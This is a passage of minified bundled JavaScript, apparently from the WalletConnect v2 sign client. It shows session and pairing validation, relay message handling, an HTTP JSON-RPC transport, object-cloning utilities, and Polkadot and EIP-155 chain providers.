                        for (const t of o)
                            try {
                                await this.onProviderMessageEvent({
                                    topic: n,
                                    message: t,
                                    publishedAt: Date.now()
                                })
                            } catch (e) {
                                this.client.logger.warn("Error processing pending message event for topic: ".concat(n, ", message: ").concat(t))
                            }
                } catch (t) {
                    this.client.logger.warn("processPendingMessageEvents failed", t)
                }
            }
            isInitialized() {
                if (!this.initialized) {
                    const {message: e} = Ug("NOT_INITIALIZED", this.name);
                    throw new Error(e)
                }
            }
            async confirmOnlineStateOrThrow() {
                await this.client.core.relayer.confirmOnlineStateOrThrow()
            }
            registerRelayerEvents() {
                this.client.core.relayer.on(em, (e => {
                    this.onProviderMessageEvent(e)
                }
                ))
            }
            async onRelayMessage(e) {
                const {topic: t, message: r, attestation: n, transportType: o} = e
                  , {publicKey: i} = this.client.auth.authKeys.keys.includes(aA) ? this.client.auth.authKeys.get(aA) : {
                    responseTopic: void 0,
                    publicKey: void 0
                };
                try {
                    const e = await this.client.core.crypto.decode(t, r, {
                        receiverPublicKey: i,
                        encoding: o === hm.link_mode ? eg : Qp
                    });
                    Uy(e) ? (this.client.core.history.set(t, e),
                    await this.onRelayEventRequest({
                        topic: t,
                        payload: e,
                        attestation: n,
                        transportType: o,
                        encryptedId: og(r)
                    })) : Dy(e) ? (await this.client.core.history.resolve(e),
                    await this.onRelayEventResponse({
                        topic: t,
                        payload: e,
                        transportType: o
                    }),
                    this.client.core.history.delete(t, e.id)) : await this.onRelayEventUnknownPayload({
                        topic: t,
                        payload: e,
                        transportType: o
                    }),
                    await this.client.core.relayer.messages.ack(t, r)
                } catch (Oe) {
                    this.client.logger.error(Oe)
                }
            }
            registerExpirerEvents() {
                this.client.core.expirer.on(_m, (async e => {
                    const {topic: t, id: r} = du(e.target);
                    return r && this.client.pendingRequest.keys.includes(r) ? await this.deletePendingSessionRequest(r, Ug("EXPIRED"), !0) : r && this.client.auth.requests.keys.includes(r) ? await this.deletePendingAuthRequest(r, Ug("EXPIRED"), !0) : void (t ? this.client.session.keys.includes(t) && (await this.deleteSession({
                        topic: t,
                        expirerHasDeleted: !0
                    }),
                    this.client.events.emit("session_expire", {
                        topic: t
                    })) : r && (await this.deleteProposal(r, !0),
                    this.client.events.emit("proposal_expire", {
                        id: r
                    })))
                }
                ))
            }
            registerPairingEvents() {
                this.client.core.pairing.events.on(Tm, (e => this.onPairingCreated(e))),
                this.client.core.pairing.events.on(Em, (e => {
                    this.addToRecentlyDeleted(e.topic, "pairing")
                }
                ))
            }
            isValidPairingTopic(e) {
                if (!Vg(e, !1)) {
                    const {message: t} = Ug("MISSING_OR_INVALID", "pairing topic should be a string: ".concat(e));
                    throw new Error(t)
                }
                if (!this.client.core.pairing.pairings.keys.includes(e)) {
                    const {message: t} = Ug("NO_MATCHING_KEY", "pairing topic doesn't exist: ".concat(e));
                    throw new Error(t)
                }
                if (fu(this.client.core.pairing.pairings.get(e).expiry)) {
                    const {message: t} = Ug("EXPIRED", "pairing topic: ".concat(e));
                    throw new Error(t)
                }
            }
            async isValidSessionTopic(e) {
                if (!Vg(e, !1)) {
                    const {message: t} = Ug("MISSING_OR_INVALID", "session topic should be a string: ".concat(e));
                    throw new Error(t)
                }
                if (this.checkRecentlyDeleted(e),
                !this.client.session.keys.includes(e)) {
                    const {message: t} = Ug("NO_MATCHING_KEY", "session topic doesn't exist: ".concat(e));
                    throw new Error(t)
                }
                if (fu(this.client.session.get(e).expiry)) {
                    await this.deleteSession({
                        topic: e
                    });
                    const {message: t} = Ug("EXPIRED", "session topic: ".concat(e));
                    throw new Error(t)
                }
                if (!this.client.core.crypto.keychain.has(e)) {
                    const {message: t} = Ug("MISSING_OR_INVALID", "session topic does not exist in keychain: ".concat(e));
                    throw await this.deleteSession({
                        topic: e
                    }),
                    new Error(t)
                }
            }
            async isValidSessionOrPairingTopic(e) {
                if (this.checkRecentlyDeleted(e),
                this.client.session.keys.includes(e))
                    await this.isValidSessionTopic(e);
                else {
                    if (!this.client.core.pairing.pairings.keys.includes(e)) {
                        if (Vg(e, !1)) {
                            const {message: t} = Ug("NO_MATCHING_KEY", "session or pairing topic doesn't exist: ".concat(e));
                            throw new Error(t)
                        }
                        {
                            const {message: t} = Ug("MISSING_OR_INVALID", "session or pairing topic should be a string: ".concat(e));
                            throw new Error(t)
                        }
                    }
                    this.isValidPairingTopic(e)
                }
            }
            async isValidProposalId(e) {
                if (!function(e) {
                    return "number" == typeof e
                }(e)) {
                    const {message: t} = Ug("MISSING_OR_INVALID", "proposal id should be a number: ".concat(e));
                    throw new Error(t)
                }
                if (!this.client.proposal.keys.includes(e)) {
                    const {message: t} = Ug("NO_MATCHING_KEY", "proposal id doesn't exist: ".concat(e));
                    throw new Error(t)
                }
                if (fu(this.client.proposal.get(e).expiryTimestamp)) {
                    await this.deleteProposal(e);
                    const {message: t} = Ug("EXPIRED", "proposal id: ".concat(e));
                    throw new Error(t)
                }
            }
        }
        class vA extends pT {
            constructor(e, t) {
                super(e, t, "proposal", KT),
                this.core = e,
                this.logger = t
            }
        }
        class wA extends pT {
            constructor(e, t) {
                super(e, t, "session", KT),
                this.core = e,
                this.logger = t
            }
        }
        class TA extends pT {
            constructor(e, t) {
                super(e, t, "request", KT, (e => e.id)),
                this.core = e,
                this.logger = t
            }
        }
        class AA extends pT {
            constructor(e, t) {
                super(e, t, "authKeys", sA, ( () => aA)),
                this.core = e,
                this.logger = t
            }
        }
        class EA extends pT {
            constructor(e, t) {
                super(e, t, "pairingTopics", sA),
                this.core = e,
                this.logger = t
            }
        }
        class PA extends pT {
            constructor(e, t) {
                super(e, t, "requests", sA, (e => e.id)),
                this.core = e,
                this.logger = t
            }
        }
        var CA = Object.defineProperty
          , SA = (e, t, r) => ( (e, t, r) => t in e ? CA(e, t, {
            enumerable: !0,
            configurable: !0,
            writable: !0,
            value: r
        }) : e[t] = r)(e, "symbol" != typeof t ? t + "" : t, r);
        class IA {
            constructor(e, t) {
                this.core = e,
                this.logger = t,
                SA(this, "authKeys"),
                SA(this, "pairingTopics"),
                SA(this, "requests"),
                this.authKeys = new AA(this.core,this.logger),
                this.pairingTopics = new EA(this.core,this.logger),
                this.requests = new PA(this.core,this.logger)
            }
            async init() {
                await this.authKeys.init(),
                await this.pairingTopics.init(),
                await this.requests.init()
            }
        }
        var BA = Object.defineProperty
          , xA = (e, t, r) => ( (e, t, r) => t in e ? BA(e, t, {
            enumerable: !0,
            configurable: !0,
            writable: !0,
            value: r
        }) : e[t] = r)(e, "symbol" != typeof t ? t + "" : t, r);
        class OA extends Qt {
            constructor(e) {
                super(e),
                xA(this, "protocol", "wc"),
                xA(this, "version", 2),
                xA(this, "name", ZT),
                xA(this, "metadata"),
                xA(this, "core"),
                xA(this, "logger"),
                xA(this, "events", new Se.EventEmitter),
                xA(this, "engine"),
                xA(this, "session"),
                xA(this, "proposal"),
                xA(this, "pendingRequest"),
                xA(this, "auth"),
                xA(this, "signConfig"),
                xA(this, "on", ( (e, t) => this.events.on(e, t))),
                xA(this, "once", ( (e, t) => this.events.once(e, t))),
                xA(this, "off", ( (e, t) => this.events.off(e, t))),
                xA(this, "removeListener", ( (e, t) => this.events.removeListener(e, t))),
                xA(this, "removeAllListeners", (e => this.events.removeAllListeners(e))),
                xA(this, "connect", (async e => {
                    try {
                        return await this.engine.connect(e)
                    } catch (_e) {
                        throw this.logger.error(_e.message),
                        _e
                    }
                }
                )),
                xA(this, "pair", (async e => {
                    try {
                        return await this.engine.pair(e)
                    } catch (_e) {
                        throw this.logger.error(_e.message),
                        _e
                    }
                }
                )),
                xA(this, "approve", (async e => {
                    try {
                        return await this.engine.approve(e)
                    } catch (_e) {
                        throw this.logger.error(_e.message),
                        _e
                    }
                }
                )),
                xA(this, "reject", (async e => {
                    try {
                        return await this.engine.reject(e)
                    } catch (_e) {
                        throw this.logger.error(_e.message),
                        _e
                    }
                }
                )),
                xA(this, "update", (async e => {
                    try {
                        return await this.engine.update(e)
                    } catch (_e) {
                        throw this.logger.error(_e.message),
                        _e
                    }
                }
                )),
                xA(this, "extend", (async e => {
                    try {
                        return await this.engine.extend(e)
                    } catch (_e) {
                        throw this.logger.error(_e.message),
                        _e
                    }
                }
                )),
                xA(this, "request", (async e => {
                    try {
                        return await this.engine.request(e)
                    } catch (_e) {
                        throw this.logger.error(_e.message),
                        _e
                    }
                }
                )),
                xA(this, "respond", (async e => {
                    try {
                        return await this.engine.respond(e)
                    } catch (_e) {
                        throw this.logger.error(_e.message),
                        _e
                    }
                }
                )),
                xA(this, "ping", (async e => {
                    try {
                        return await this.engine.ping(e)
                    } catch (_e) {
                        throw this.logger.error(_e.message),
                        _e
                    }
                }
                )),
                xA(this, "emit", (async e => {
                    try {
                        return await this.engine.emit(e)
                    } catch (_e) {
                        throw this.logger.error(_e.message),
                        _e
                    }
                }
                )),
                xA(this, "disconnect", (async e => {
                    try {
                        return await this.engine.disconnect(e)
                    } catch (_e) {
                        throw this.logger.error(_e.message),
                        _e
                    }
                }
                )),
                xA(this, "find", (e => {
                    try {
                        return this.engine.find(e)
                    } catch (_e) {
                        throw this.logger.error(_e.message),
                        _e
                    }
                }
                )),
                xA(this, "getPendingSessionRequests", ( () => {
                    try {
                        return this.engine.getPendingSessionRequests()
                    } catch (_l) {
                        throw this.logger.error(_l.message),
                        _l
                    }
                }
                )),
                xA(this, "authenticate", (async (e, t) => {
                    try {
                        return await this.engine.authenticate(e, t)
                    } catch (Ot) {
                        throw this.logger.error(Ot.message),
                        Ot
                    }
                }
                )),
                xA(this, "formatAuthMessage", (e => {
                    try {
                        return this.engine.formatAuthMessage(e)
                    } catch (_e) {
                        throw this.logger.error(_e.message),
                        _e
                    }
                }
                )),
                xA(this, "approveSessionAuthenticate", (async e => {
                    try {
                        return await this.engine.approveSessionAuthenticate(e)
                    } catch (_e) {
                        throw this.logger.error(_e.message),
                        _e
                    }
                }
                )),
                xA(this, "rejectSessionAuthenticate", (async e => {
                    try {
                        return await this.engine.rejectSessionAuthenticate(e)
                    } catch (_e) {
                        throw this.logger.error(_e.message),
                        _e
                    }
                }
                )),
                this.name = (null === e || void 0 === e ? void 0 : e.name) || ZT,
                this.metadata = tu(null === e || void 0 === e ? void 0 : e.metadata),
                this.signConfig = null === e || void 0 === e ? void 0 : e.signConfig;
                const t = typeof (null === e || void 0 === e ? void 0 : e.logger) < "u" && "string" != typeof (null === e || void 0 === e ? void 0 : e.logger) ? e.logger : pt()(Wt({
                    level: (null === e || void 0 === e ? void 0 : e.logger) || YT
                }));
                this.core = (null === e || void 0 === e ? void 0 : e.core) || new GT(e),
                this.logger = kt(t, this.name),
                this.session = new wA(this.core,this.logger),
                this.proposal = new vA(this.core,this.logger),
                this.pendingRequest = new TA(this.core,this.logger),
                this.engine = new bA(this),
                this.auth = new IA(this.core,this.logger)
            }
            static async init(e) {
                const t = new OA(e);
                return await t.initialize(),
                t
            }
            get context() {
                return Rt(this.logger)
            }
            get pairing() {
                return this.core.pairing.pairings
            }
            async initialize() {
                this.logger.trace("Initialized");
                try {
                    await this.core.start(),
                    await this.session.init(),
                    await this.proposal.init(),
                    await this.pendingRequest.init(),
                    await this.auth.init(),
                    await this.engine.init(),
                    this.logger.info("SignClient Initialization Success"),
                    setTimeout(( () => {
                        this.engine.processRelayMessageCache()
                    }
                    ), (0,
                    Be.toMiliseconds)(Be.ONE_SECOND))
                } catch (e) {
                    throw this.logger.info("SignClient Initialization Failure"),
                    this.logger.error(e.message),
                    e
                }
            }
        }
        var _A = r(9038)
          , WA = r.n(_A)
          , RA = Object.defineProperty
          , kA = Object.defineProperties
          , MA = Object.getOwnPropertyDescriptors
          , NA = Object.getOwnPropertySymbols
          , FA = Object.prototype.hasOwnProperty
          , UA = Object.prototype.propertyIsEnumerable
          , DA = (e, t, r) => t in e ? RA(e, t, {
            enumerable: !0,
            configurable: !0,
            writable: !0,
            value: r
        }) : e[t] = r
          , LA = (e, t) => {
            for (var r in t || (t = {}))
                FA.call(t, r) && DA(e, r, t[r]);
            if (NA)
                for (var r of NA(t))
                    UA.call(t, r) && DA(e, r, t[r]);
            return e
        }
          , jA = (e, t) => kA(e, MA(t));
        const zA = {
            headers: {
                Accept: "application/json",
                "Content-Type": "application/json"
            },
            method: "POST"
        };
        class VA {
            constructor(e) {
                let t = arguments.length > 1 && void 0 !== arguments[1] && arguments[1];
                if (this.url = e,
                this.disableProviderPing = t,
                this.events = new Se.EventEmitter,
                this.isAvailable = !1,
                this.registering = !1,
                !My(e))
                    throw new Error("Provided URL is not compatible with HTTP connection: ".concat(e));
                this.url = e,
                this.disableProviderPing = t
            }
            get connected() {
                return this.isAvailable
            }
            get connecting() {
                return this.registering
            }
            on(e, t) {
                this.events.on(e, t)
            }
            once(e, t) {
                this.events.once(e, t)
            }
            off(e, t) {
                this.events.off(e, t)
            }
            removeListener(e, t) {
                this.events.removeListener(e, t)
            }
            async open() {
                let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : this.url;
                await this.register(e)
            }
            async close() {
                if (!this.isAvailable)
                    throw new Error("Connection already closed");
                this.onClose()
            }
            async send(e) {
                this.isAvailable || await this.register();
                try {
                    const t = ot(e)
                      , r = await (await WA()(this.url, jA(LA({}, zA), {
                        body: t
                    }))).json();
                    this.onPayload({
                        data: r
                    })
                } catch (_l) {
                    this.onError(e.id, _l)
                }
            }
            async register() {
                let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : this.url;
                if (!My(e))
                    throw new Error("Provided URL is not compatible with HTTP connection: ".concat(e));
                if (this.registering) {
                    const e = this.events.getMaxListeners();
                    return (this.events.listenerCount("register_error") >= e || this.events.listenerCount("open") >= e) && this.events.setMaxListeners(e + 1),
                    new Promise(( (e, t) => {
                        this.events.once("register_error", (e => {
                            this.resetMaxListeners(),
                            t(e)
                        }
                        )),
                        this.events.once("open", ( () => {
                            if (this.resetMaxListeners(),
                            typeof this.isAvailable > "u")
                                return t(new Error("HTTP connection is missing or invalid"));
                            e()
                        }
                        ))
                    }
                    ))
                }
                this.url = e,
                this.registering = !0;
                try {
                    if (!this.disableProviderPing) {
                        const t = ot({
                            id: 1,
                            jsonrpc: "2.0",
                            method: "test",
                            params: []
                        });
                        await WA()(e, jA(LA({}, zA), {
                            body: t
                        }))
                    }
                    this.onOpen()
                } catch (_l) {
                    const t = this.parseError(_l);
                    throw this.events.emit("register_error", t),
                    this.onClose(),
                    t
                }
            }
            onOpen() {
                this.isAvailable = !0,
                this.registering = !1,
                this.events.emit("open")
            }
            onClose() {
                this.isAvailable = !1,
                this.registering = !1,
                this.events.emit("close")
            }
            onPayload(e) {
                if (typeof e.data > "u")
                    return;
                const t = "string" == typeof e.data ? nt(e.data) : e.data;
                this.events.emit("payload", t)
            }
            onError(e, t) {
                const r = this.parseError(t)
                  , n = xy(e, r.message || r.toString());
                this.events.emit("payload", n)
            }
            parseError(e) {
                return Ey(e, arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : this.url, "HTTP")
            }
            resetMaxListeners() {
                this.events.getMaxListeners() > 10 && this.events.setMaxListeners(10)
            }
        }
        const HA = "error"
          , qA = "".concat("wc", "@2:").concat("universal_provider", ":")
          , GA = "https://rpc.walletconnect.org/v1/"
          , $A = "generic"
          , KA = "".concat(GA, "bundler")
          , ZA = "default_chain_changed";
        function YA(e) {
            return "object" == typeof e && null !== e
        }
        function JA(e) {
            return null == e || "object" != typeof e && "function" != typeof e
        }
        function XA(e) {
            return Object.getOwnPropertySymbols(e).filter((t => Object.prototype.propertyIsEnumerable.call(e, t)))
        }
        function QA(e) {
            return null == e ? void 0 === e ? "[object Undefined]" : "[object Null]" : Object.prototype.toString.call(e)
        }
        const eE = "[object RegExp]"
          , tE = "[object String]"
          , rE = "[object Number]"
          , nE = "[object Boolean]"
          , oE = "[object Arguments]"
          , iE = "[object Symbol]"
          , sE = "[object Date]"
          , aE = "[object Map]"
          , cE = "[object Set]"
          , lE = "[object Array]"
          , uE = "[object ArrayBuffer]"
          , dE = "[object Object]"
          , hE = "[object DataView]"
          , fE = "[object Uint8Array]"
          , pE = "[object Uint8ClampedArray]"
          , gE = "[object Uint16Array]"
          , yE = "[object Uint32Array]"
          , mE = "[object Int8Array]"
          , bE = "[object Int16Array]"
          , vE = "[object Int32Array]"
          , wE = "[object Float32Array]"
          , TE = "[object Float64Array]";
        function AE(e) {
            return ArrayBuffer.isView(e) && !(e instanceof DataView)
        }
        function EE(e, t, r) {
            let n = arguments.length > 3 && void 0 !== arguments[3] ? arguments[3] : new Map
              , o = arguments.length > 4 && void 0 !== arguments[4] ? arguments[4] : void 0;
            const i = null === o || void 0 === o ? void 0 : o(e, t, r, n);
            if (null != i)
                return i;
            if (JA(e))
                return e;
            if (n.has(e))
                return n.get(e);
            if (Array.isArray(e)) {
                const t = new Array(e.length);
                n.set(e, t);
                for (let i = 0; i < e.length; i++)
                    t[i] = EE(e[i], i, r, n, o);
                return Object.hasOwn(e, "index") && (t.index = e.index),
                Object.hasOwn(e, "input") && (t.input = e.input),
                t
            }
            if (e instanceof Date)
                return new Date(e.getTime());
            if (e instanceof RegExp) {
                const t = new RegExp(e.source,e.flags);
                return t.lastIndex = e.lastIndex,
                t
            }
            if (e instanceof Map) {
                const t = new Map;
                n.set(e, t);
                for (const [i,s] of e)
                    t.set(i, EE(s, i, r, n, o));
                return t
            }
            if (e instanceof Set) {
                const t = new Set;
                n.set(e, t);
                for (const i of e)
                    t.add(EE(i, void 0, r, n, o));
                return t
            }
            if (typeof Buffer < "u" && Buffer.isBuffer(e))
                return e.subarray();
            if (AE(e)) {
                const t = new (Object.getPrototypeOf(e).constructor)(e.length);
                n.set(e, t);
                for (let i = 0; i < e.length; i++)
                    t[i] = EE(e[i], i, r, n, o);
                return t
            }
            if (e instanceof ArrayBuffer || typeof SharedArrayBuffer < "u" && e instanceof SharedArrayBuffer)
                return e.slice(0);
            if (e instanceof DataView) {
                const t = new DataView(e.buffer.slice(0),e.byteOffset,e.byteLength);
                return n.set(e, t),
                PE(t, e, r, n, o),
                t
            }
            if (typeof File < "u" && e instanceof File) {
                const t = new File([e],e.name,{
                    type: e.type
                });
                return n.set(e, t),
                PE(t, e, r, n, o),
                t
            }
            if (e instanceof Blob) {
                const t = new Blob([e],{
                    type: e.type
                });
                return n.set(e, t),
                PE(t, e, r, n, o),
                t
            }
            if (e instanceof Error) {
                const t = new e.constructor;
                return n.set(e, t),
                t.message = e.message,
                t.name = e.name,
                t.stack = e.stack,
                t.cause = e.cause,
                PE(t, e, r, n, o),
                t
            }
            if ("object" == typeof e && function(e) {
                switch (QA(e)) {
                case oE:
                case lE:
                case uE:
                case hE:
                case nE:
                case sE:
                case wE:
                case TE:
                case mE:
                case bE:
                case vE:
                case aE:
                case rE:
                case dE:
                case eE:
                case cE:
                case tE:
                case iE:
                case fE:
                case pE:
                case gE:
                case yE:
                    return !0;
                default:
                    return !1
                }
            }(e)) {
                const t = Object.create(Object.getPrototypeOf(e));
                return n.set(e, t),
                PE(t, e, r, n, o),
                t
            }
            return e
        }
        function PE(e, t) {
            let r = arguments.length > 2 && void 0 !== arguments[2] ? arguments[2] : e
              , n = arguments.length > 3 ? arguments[3] : void 0
              , o = arguments.length > 4 ? arguments[4] : void 0;
            const i = [...Object.keys(t), ...XA(t)];
            for (let s = 0; s < i.length; s++) {
                const a = i[s]
                  , c = Object.getOwnPropertyDescriptor(e, a);
                (null == c || c.writable) && (e[a] = EE(t[a], a, r, n, o))
            }
        }
        function CE(e, t) {
            return function(e, t) {
                return EE(e, void 0, e, new Map, t)
            }(e, ( (r, n, o, i) => {
                const s = null === t || void 0 === t ? void 0 : t(r, n, o, i);
                if (null != s)
                    return s;
                if ("object" == typeof e)
                    switch (Object.prototype.toString.call(e)) {
                    case rE:
                    case tE:
                    case nE:
                        {
                            const t = new e.constructor(null === e || void 0 === e ? void 0 : e.valueOf());
                            return PE(t, e),
                            t
                        }
                    case oE:
                        {
                            const t = {};
                            return PE(t, e),
                            t.length = e.length,
                            t[Symbol.iterator] = e[Symbol.iterator],
                            t
                        }
                    default:
                        return
                    }
            }
            ))
        }
        function SE(e) {
            return CE(e)
        }
        function IE(e) {
            return null !== e && "object" == typeof e && "[object Arguments]" === QA(e)
        }
        function BE(e) {
            return AE(e)
        }
        function xE() {}
        function OE(e) {
            if ("object" != typeof e || null == e)
                return !1;
            if (null === Object.getPrototypeOf(e))
                return !0;
            if ("[object Object]" !== Object.prototype.toString.call(e)) {
                var t;
                const r = e[Symbol.toStringTag];
                return !(null == r || null === (t = Object.getOwnPropertyDescriptor(e, Symbol.toStringTag)) || void 0 === t || !t.writable) && e.toString() === "[object ".concat(r, "]")
            }
            let r = e;
            for (; null !== Object.getPrototypeOf(r); )
                r = Object.getPrototypeOf(r);
            return Object.getPrototypeOf(e) === r
        }
        function _E(e, t, r, n) {
            if (JA(e) && (e = Object(e)),
            null == t || "object" != typeof t)
                return e;
            if (n.has(t))
                return function(e) {
                    if (JA(e))
                        return e;
                    if (Array.isArray(e) || AE(e) || e instanceof ArrayBuffer || typeof SharedArrayBuffer < "u" && e instanceof SharedArrayBuffer)
                        return e.slice(0);
                    const t = Object.getPrototypeOf(e)
                      , r = t.constructor;
                    if (e instanceof Date || e instanceof Map || e instanceof Set)
                        return new r(e);
                    if (e instanceof RegExp) {
                        const t = new r(e);
                        return t.lastIndex = e.lastIndex,
                        t
                    }
                    if (e instanceof DataView)
                        return new r(e.buffer.slice(0));
                    if (e instanceof Error) {
                        const t = new r(e.message);
                        return t.stack = e.stack,
                        t.name = e.name,
                        t.cause = e.cause,
                        t
                    }
                    if (typeof File < "u" && e instanceof File)
                        return new r([e],e.name,{
                            type: e.type,
                            lastModified: e.lastModified
                        });
                    if ("object" == typeof e) {
                        const r = Object.create(t);
                        return Object.assign(r, e)
                    }
                    return e
                }(n.get(t));
            if (n.set(t, e),
            Array.isArray(t)) {
                t = t.slice();
                for (let e = 0; e < t.length; e++) {
                    var o;
                    t[e] = null !== (o = t[e]) && void 0 !== o ? o : void 0
                }
            }
            const i = [...Object.keys(t), ...XA(t)];
            for (let s = 0; s < i.length; s++) {
                const o = i[s];
                let a = t[o]
                  , c = e[o];
                if (IE(a) && (a = (0,
                k.A)({}, a)),
                IE(c) && (c = (0,
                k.A)({}, c)),
                typeof Buffer < "u" && Buffer.isBuffer(a) && (a = SE(a)),
                Array.isArray(a))
                    if ("object" == typeof c && null != c) {
                        const e = []
                          , t = Reflect.ownKeys(c);
                        for (let r = 0; r < t.length; r++) {
                            const n = t[r];
                            e[n] = c[n]
                        }
                        c = e
                    } else
                        c = [];
                const l = r(c, a, o, e, t, n);
                null != l ? e[o] = l : Array.isArray(a) || YA(c) && YA(a) ? e[o] = _E(c, a, r, n) : null == c && OE(a) ? e[o] = _E({}, a, r, n) : null == c && BE(a) ? e[o] = SE(a) : (void 0 === c || void 0 !== a) && (e[o] = a)
            }
            return e
        }
        function WE(e) {
            for (var t = arguments.length, r = new Array(t > 1 ? t - 1 : 0), n = 1; n < t; n++)
                r[n - 1] = arguments[n];
            return function(e) {
                for (var t = arguments.length, r = new Array(t > 1 ? t - 1 : 0), n = 1; n < t; n++)
                    r[n - 1] = arguments[n];
                const o = r.slice(0, -1)
                  , i = r[r.length - 1];
                let s = e;
                for (let a = 0; a < o.length; a++)
                    s = _E(s, o[a], i, new Map);
                return s
            }(e, ...r, xE)
        }
        var RE = Object.defineProperty
          , kE = Object.defineProperties
          , ME = Object.getOwnPropertyDescriptors
          , NE = Object.getOwnPropertySymbols
          , FE = Object.prototype.hasOwnProperty
          , UE = Object.prototype.propertyIsEnumerable
          , DE = (e, t, r) => t in e ? RE(e, t, {
            enumerable: !0,
            configurable: !0,
            writable: !0,
            value: r
        }) : e[t] = r
          , LE = (e, t) => {
            for (var r in t || (t = {}))
                FE.call(t, r) && DE(e, r, t[r]);
            if (NE)
                for (var r of NE(t))
                    UE.call(t, r) && DE(e, r, t[r]);
            return e
        }
          , jE = (e, t) => kE(e, ME(t));
        function zE(e, t, r) {
            var n;
            const o = Ml(e);
            return (null == (n = t.rpcMap) ? void 0 : n[o.reference]) || "".concat(GA, "?chainId=").concat(o.namespace, ":").concat(o.reference, "&projectId=").concat(r)
        }
        function VE(e) {
            return e.includes(":") ? e.split(":")[1] : e
        }
        function HE(e) {
            return e.map((e => "".concat(e.split(":")[0], ":").concat(e.split(":")[1])))
        }
        function qE() {
            let e = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : {};
            return WE(GE(arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : {}), GE(e))
        }
        function GE(e) {
            var t, r, n, o, i;
            const s = {};
            if (!jg(e))
                return s;
            for (const [a,c] of Object.entries(e)) {
                const e = Wg(a) ? [a] : c.chains
                  , l = c.methods || []
                  , u = c.events || []
                  , d = c.rpcMap || {}
                  , h = Rg(a);
                s[h] = jE(LE(LE({}, s[h]), c), {
                    chains: gu(e, null == (t = s[h]) ? void 0 : t.chains),
                    methods: gu(l, null == (r = s[h]) ? void 0 : r.methods),
                    events: gu(u, null == (n = s[h]) ? void 0 : n.events)
                }),
                (jg(d) || jg((null == (o = s[h]) ? void 0 : o.rpcMap) || {})) && (s[h].rpcMap = LE(LE({}, d), null == (i = s[h]) ? void 0 : i.rpcMap))
            }
            return s
        }
        function $E(e) {
            return e.includes(":") ? e.split(":")[2] : e
        }
        function KE(e) {
            const t = {};
            for (const [r,n] of Object.entries(e)) {
                const e = n.methods || []
                  , o = n.events || []
                  , i = n.accounts || []
                  , s = Wg(r) ? [r] : n.chains ? n.chains : HE(n.accounts);
                t[r] = {
                    chains: s,
                    methods: e,
                    events: o,
                    accounts: i
                }
            }
            return t
        }
        function ZE(e) {
            return "number" == typeof e ? e : e.includes("0x") ? parseInt(e, 16) : (e = e.includes(":") ? e.split(":")[1] : e,
            isNaN(Number(e)) ? e : Number(e))
        }
        const YE = {}
          , JE = e => YE[e]
          , XE = (e, t) => {
            YE[e] = t
        }
        ;
        var QE = Object.defineProperty
          , eP = (e, t, r) => ( (e, t, r) => t in e ? QE(e, t, {
            enumerable: !0,
            configurable: !0,
            writable: !0,
            value: r
        }) : e[t] = r)(e, "symbol" != typeof t ? t + "" : t, r);
        class tP {
            constructor(e) {
                eP(this, "name", "polkadot"),
                eP(this, "client"),
                eP(this, "httpProviders"),
                eP(this, "events"),
                eP(this, "namespace"),
                eP(this, "chainId"),
                this.namespace = e.namespace,
                this.events = JE("events"),
                this.client = JE("client"),
                this.chainId = this.getDefaultChain(),
                this.httpProviders = this.createHttpProviders()
            }
            updateNamespace(e) {
                this.namespace = Object.assign(this.namespace, e)
            }
            requestAccounts() {
                return this.getAccounts()
            }
            getDefaultChain() {
                if (this.chainId)
                    return this.chainId;
                if (this.namespace.defaultChain)
                    return this.namespace.defaultChain;
                const e = this.namespace.chains[0];
                if (!e)
                    throw new Error("ChainId not found");
                return e.split(":")[1]
            }
            request(e) {
                return this.namespace.methods.includes(e.request.method) ? this.client.request(e) : this.getHttpProvider().request(e.request)
            }
            setDefaultChain(e, t) {
                this.httpProviders[e] || this.setHttpProvider(e, t),
                this.chainId = e,
                this.events.emit(ZA, "".concat(this.name, ":").concat(e))
            }
            getAccounts() {
                const e = this.namespace.accounts;
                return e && e.filter((e => e.split(":")[1] === this.chainId.toString())).map((e => e.split(":")[2])) || []
            }
            createHttpProviders() {
                const e = {};
                return this.namespace.chains.forEach((t => {
                    var r;
                    const n = VE(t);
                    e[n] = this.createHttpProvider(n, null == (r = this.namespace.rpcMap) ? void 0 : r[t])
                }
                )),
                e
            }
            getHttpProvider() {
                const e = "".concat(this.name, ":").concat(this.chainId)
                  , t = this.httpProviders[e];
                if (typeof t > "u")
                    throw new Error("JSON-RPC provider for ".concat(e, " not found"));
                return t
            }
            setHttpProvider(e, t) {
                const r = this.createHttpProvider(e, t);
                r && (this.httpProviders[e] = r)
            }
            createHttpProvider(e, t) {
                const r = t || zE(e, this.namespace, this.client.core.projectId);
                if (!r)
                    throw new Error("No RPC url provided for chainId: ".concat(e));
                return new zy(new VA(r,JE("disableProviderPing")))
            }
        }
        var rP = Object.defineProperty
          , nP = Object.defineProperties
          , oP = Object.getOwnPropertyDescriptors
          , iP = Object.getOwnPropertySymbols
          , sP = Object.prototype.hasOwnProperty
          , aP = Object.prototype.propertyIsEnumerable
          , cP = (e, t, r) => t in e ? rP(e, t, {
            enumerable: !0,
            configurable: !0,
            writable: !0,
            value: r
        }) : e[t] = r
          , lP = (e, t) => {
            for (var r in t || (t = {}))
                sP.call(t, r) && cP(e, r, t[r]);
            if (iP)
                for (var r of iP(t))
                    aP.call(t, r) && cP(e, r, t[r]);
            return e
        }
          , uP = (e, t) => nP(e, oP(t))
          , dP = (e, t, r) => cP(e, "symbol" != typeof t ? t + "" : t, r);
        class hP {
            constructor(e) {
                dP(this, "name", "eip155"),
                dP(this, "client"),
                dP(this, "chainId"),
                dP(this, "namespace"),
                dP(this, "httpProviders"),
                dP(this, "events"),
                this.namespace = e.namespace,
                this.events = JE("events"),
                this.client = JE("client"),
                this.httpProviders = this.createHttpProviders(),
                this.chainId = parseInt(this.getDefaultChain())
            }
            async request(e) {
                switch (e.request.method) {
                case "eth_requestAccounts":
                case "eth_accounts":
                    return this.getAccounts();
                case "wallet_switchEthereumChain":
                    return await this.handleSwitchChain(e);
                case "eth_chainId":
                    return parseInt(this.getDefaultChain());
                case "wallet_getCapabilities":
                    return await this.getCapabilities(e);
                case "wallet_getCallsStatus":
                    return await this.getCallStatus(e)
                }
                return this.namespace.methods.includes(e.request.method) ? await this.client.request(e) : this.getHttpProvider().request(e.request)
            }
            updateNamespace(e) {
                this.namespace = Object.assign(this.namespace, e)
            }
            setDefaultChain(e, t) {
